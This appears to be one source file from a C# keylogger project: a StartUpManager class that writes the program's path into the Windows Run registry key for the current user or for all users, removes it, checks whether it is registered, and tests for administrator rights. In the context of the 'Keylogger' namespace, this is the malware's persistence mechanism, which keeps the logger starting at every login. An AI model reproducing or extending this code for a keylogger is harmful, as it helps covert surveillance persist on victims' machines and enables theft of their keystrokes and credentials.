using System.Security.Principal;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Keylogger
{
    public static class StartUpManager
    {
        private const string NamePath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

        /// <summary>
        /// Indica si esta registrado en el Startup
        /// </summary>
        /// <returns></returns>
        public static bool IsStartup()
        {
            using (var key = Registry.CurrentUser.OpenSubKey(NamePath, true))
            {
                return key?.GetValue(Application.ProductName) != null;
            }
        }
        public static void AddApplicationToCurrentUserStartup()
        {
            using (var key = Registry.CurrentUser.OpenSubKey(NamePath, true))
            {
                key?.SetValue(Application.ProductName, Application.ExecutablePath);
            }
        }

        public static void AddApplicationToAllUserStartup()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(NamePath, true))
            {
                key?.SetValue(Application.ProductName, Application.ExecutablePath);
            }
        }

        public static void RemoveApplicationFromCurrentUserStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(NamePath, true))
            {
                key?.DeleteValue(Application.ProductName, false);
            }
        }

        public static void RemoveApplicationFromAllUserStartup()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(NamePath, true))
            {
                key?.DeleteValue(Application.ProductName, false);
            }
        }

        public static bool IsUserAdministrator()
        {
            //bool value to hold our return value
            bool isAdmin;
            try
            {
                //get the currently logged in user
                var user = WindowsIdentity.GetCurrent();
                var principal = new WindowsPrincipal(user);
                System.Diagnostics.Debug.WriteLine(principal.Identity.Name);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch
            {
                isAdmin = false;
            }
            return isAdmin;
        }
    }
}
